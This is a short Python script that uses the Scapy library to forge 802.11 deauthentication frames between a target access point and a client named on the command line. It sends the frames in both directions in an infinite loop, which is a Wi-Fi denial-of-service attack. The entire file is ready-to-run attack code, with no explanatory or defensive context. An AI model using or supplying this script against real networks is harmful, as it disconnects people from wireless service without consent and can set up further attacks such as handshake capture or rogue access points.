#!/usr/bin/env python

import sys

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import sendp
from scapy.all import *


interface=sys.argv[1]
device_target=sys.argv[2]
client_target=sys.argv[3]

print ('Deauthing',client_target,'from',device_target,'...')
pkt1 = RadioTap() / Dot11(addr1=client_target, addr2=device_target, addr3=device_target) / Dot11Deauth()
pkt2 = RadioTap() / Dot11(addr1=device_target, addr2=client_target, addr3=client_target) / Dot11Deauth()

while True:
	sendp(pkt1, iface=interface)
	sendp(pkt2, iface=interface)
	print("----------------------Send Packets----------------------")
